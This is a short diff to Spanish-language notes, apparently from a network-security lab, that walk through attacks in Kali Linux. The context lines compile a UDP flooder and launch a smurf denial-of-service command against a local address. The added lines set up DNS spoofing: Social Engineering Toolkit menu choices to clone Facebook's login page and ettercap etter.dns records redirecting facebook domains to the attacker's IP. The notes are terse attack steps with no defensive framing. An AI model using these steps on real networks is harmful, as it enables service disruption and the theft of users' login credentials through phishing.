@@ -21,3 +21,15 @@ En una terminal de Kali Linux, ubicandoneos en al carpoeta smurf (descargada)
 	sudo gcc flooder_udp.c -o flooder_udp 
 	2.- ataque
 	./smurf 192.168.0.1 broadcast.txt  0 0 1024 
+	
+Ataque DNS SPOOFING
+En kali Linux: Aplicaciones –> Kali Linux –> Exploitation Tools –> Social Engineering Toolkit –> se-toolkit
+	1 , 2 , 3 , 2
+	Ip atacante 
+	https://www.facebook.com/
+	
+	Editar el archivo /usr/share/ettercap/etter.dns
+	http://www.facebook.es A  IP_destino
+	*.facebook.* A  IP_destino
+	http://www.facebook.es PTR  IP_destino
+
